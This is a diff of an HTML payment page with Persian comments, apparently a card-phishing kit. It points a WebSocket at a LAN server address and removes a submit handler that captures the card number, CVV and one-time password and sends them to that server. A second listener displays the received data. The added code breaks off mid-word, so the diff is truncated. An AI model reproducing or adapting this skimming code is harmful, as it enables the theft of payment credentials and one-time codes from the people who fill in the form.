@@ -28,7 +28,7 @@
     </div>
 
     <script>
-        const socket = new WebSocket('ws://localhost:3000'); // آدرس سرور شما
+        const socket = new WebSocket('ws://192.168.1.101:3000'); // آدرس IP خود را قرار دهید
 
         // هنگام دریافت اطلاعات از سرور
         socket.addEventListener('message', function (event) {
@@ -38,16 +38,4 @@
             infoList.appendChild(newItem);
         });
 
-        // ارسال اطلاعات به سرور
-        document.getElementById('payment-form').addEventListener('submit', function(event) {
-            event.preventDefault();
-            const cardNumber = document.getElementById('card-number').value;
-            const cvv = document.getElementById('cvv').value;
-            const otp = document.getElementById('otp').value;
-            const fullInfo = `شماره کارت: ${cardNumber}, CVV: ${cvv}, رمز پویا: ${otp}`; // ترکیب اطلاعات
-            socket.send(fullInfo); // ارسال اطلاعات به سرور
-            this.reset(); // پاک کردن فرم
-        });
-    </script>
-</body>
-</html>
+        // ارسال اطلاعا
